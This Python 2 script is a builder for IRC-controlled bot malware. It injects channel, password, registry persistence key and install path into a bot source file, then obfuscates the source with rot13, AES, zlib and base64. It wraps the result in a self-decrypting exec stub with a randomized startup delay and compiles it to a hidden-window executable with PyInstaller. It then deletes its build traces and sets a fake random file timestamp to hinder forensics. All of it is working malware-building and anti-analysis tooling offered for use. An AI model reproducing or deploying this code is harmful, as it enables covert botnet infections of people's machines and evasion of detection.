import sys, random, string, os, urllib, time, base64, zlib
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
os.chdir("\\python27\\scripts\\")
os.system("copy lel.exe chp.exe")
#print "python "+sys.argv[0]+" BotMainProcess.exe DaemonProcess.exe #IRCchannel ChannelPassword RegKeyName InstallDirectory(inside AppData) OutFileName.exe"
class AESCipher(object):
    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


botmainprocess=sys.argv[1]
botdaemonprocess=sys.argv[2]
ircchannel=sys.argv[3]
ircchannelpassword=sys.argv[4]
regkeyname=sys.argv[5]
installdirectory=sys.argv[6]
outfilename=sys.argv[7]

def grabSRC():
    f = open("\\python27\\scripts\\ZIB.py", "r")
    source = f.read()
    f.close()
    return source

botSRC = grabSRC()
botSRC = botSRC.replace("botProc = \"\"", "botProc = \""+botmainprocess+"\"") #bot process
botSRC = botSRC.replace("daemonProc = \"\"", "daemonProc = \""+botdaemonprocess+"\"")
botSRC = botSRC.replace("#YourIRCchannelHERE", ircchannel)
botSRC = botSRC.replace("channelpassword=\"\"", "channelpassword=\""+ircchannelpassword+"\"")
botSRC = botSRC.replace("regKey=\"\"", "regKey=\""+regkeyname+"\"")
botSRC = botSRC.replace("installDir=HERE", "installDir=\"\\\\"+installdirectory+"\"")
botSRC = botSRC.encode("rot13")
AESkey=""
for x in range(0,32):
    AESkey = AESkey + random.choice(string.letters+string.digits)
AESobj = AESCipher(AESkey)
botSRC = AESobj.encrypt(botSRC)

botSRC = base64.urlsafe_b64encode(zlib.compress(botSRC,9))
#print AESobj.decrypt(zlib.decompress(base64.urlsafe_b64decode(botSRC))).encode("rot13")
#newPyObf = random.choice(string.letters+string.letters).lower()
#for x in range(0,random.randrange(5,12)):
#    newPyObf = newPyObf + random.choice(string.letters+string.letters).lower()
#f = open("\\python27\\scripts\\PyObf.py", "r")
#PyObfNewCode = f.read()
#f.close()
#newObfuscate=random.choice(string.letters+string.letters).lower()
#for x in range(5,12):
#    newObfuscate = newObfuscate + random.choice(string.letters+string.letters).lower()
#newDeobfuscate=random.choice(string.letters+string.letters).lower()
#for x in range(5,12):
#    newDeobfuscate = newDeobfuscate + random.choice(string.letters+string.letters).lower()
#PyObfNewCode=PyObfNewCode.replace("deobfuscate", newDeobfuscate)
#PyObfNewCode=PyObfNewCode.replace("obfuscate", newObfuscate)
#f = open("\\python27\\scripts\\"+newPyObf+".py", "w")
#f.write(PyObfNewCode)
#f.close()

mainimports = urllib.urlopen("\\python27\\scripts\\ZIB_imports.txt").read()#.replace("PyObf", newPyObf)
#obf1=0#random.randrange(1,3) - zlib
#obf2=0#random.randrange(0,1) - bz2
#obf3=0#random.randrange(0,0) - base64
#obf4=1#random.randrange(0,0) - rot13
#botSRC = PyObf.obfuscate(obf1, obf2, obf3, obf4, botSRC)
randomString = ""
for x in range(0,25):
    randomString = randomString + random.choice(string.letters+string.digits)
botSRC_ = mainimports + "\sleep(randrange("+str(random.randrange(15,17))+","+str(random.randrange(25,30))+"))\n"
botSRC_ = botSRC_ + random.choice(string.letters+string.letters)+"=\""
botSRC_ = botSRC_+randomString
mainCodeVar = random.choice(string.letters+string.letters)
aesobjname = random.choice(string.letters)*3
botSRC_ = botSRC_+"\"\n"+mainCodeVar+" = \"\"\""+botSRC+"\"\"\"\n"+aesobjname+" = AESCipher(""+AESkey+"")\n"+mainCodeVar+" = "+aesobjname+".decrypt(zlib.decompress(base64.urlsafe_b64decode("+mainCodeVar+"))).encode(\"rot13\")\nexec "+mainCodeVar
fileOut=""
while 1:
    for x in range(0,12):
        fileOut = fileOut + random.choice(string.letters+string.digits)
    fileOut = fileOut + ".py"
    if not os.path.isfile("\\python27\\scripts\\"+fileOut):
        f = open("\\python27\\scripts\\"+fileOut, "w")
        f.write(botSRC_)
        f.close()
        break
def fixDate(thetime):
    if int(thetime) < 10:
        thetime = "0"+thetime
    return thetime
if os.path.isfile("\\python27\\scripts\\"+fileOut):
    print "compiling..."
    os.system("\\python27\\scripts\\pyinstaller -F -w \\python27\\scripts\\"+fileOut+" --noupx")
    print "compiled."
    print "deleting left-over files..."
    #os.system("echo y | del \\python27\\scripts\\"+newPyObf+".py")
    os.system("echo y | del \\python27\\scripts\\build")
    #os.system("echo y | del \\python27\\scripts\\"+newPyObf+".pyc")
    os.system("echo y | del \\python27\\scripts\\"+fileOut)
    os.system("echo y | del \\python27\\scripts\\"+fileOut.replace(".py", ".spec"))
    print "files deleted."
    month=fixDate(str(random.randrange(1,12)))
    day=fixDate(str(random.randrange(1,31)))
    year = str(random.randrange(2001, 2015))
    hour = fixDate(str(random.randrange(1,24)))
    minute = fixDate(str(random.randrange(1,59)))
    second = fixDate(str(random.randrange(1,59)))
    date = day+"-"+month+"-"+year+" "+hour+":"+minute+":"+second
    print "changing file date to: "+date
    os.system("\\python27\\scripts\\nircmd setfiletime \"C:\\Python27\\Scripts\\dist\\"+fileOut.replace(".py", ".exe")+"\" \""+date+"\" \""+date+"\"")
    print "file date changed to: "+date
    if os.path.isfile("\\python27\\scripts\\dist\\"+fileOut.replace(".py", ".exe")):
        os.system("move C:\\Python27\\Scripts\\dist\\"+fileOut.replace(".py", ".exe")+" C:\\Python27\\Scripts\\dist\\"+outfilename)
        time.sleep(180) #sleep for 3 minutes
        while 1:
            time.sleep(1)
            if os.path.isfile("\\python27\\scripts\\dist\\"+outfilename):
                os.system("echo y | del \\python27\\scripts\\dist\\"+outfilename)
            else:
                break

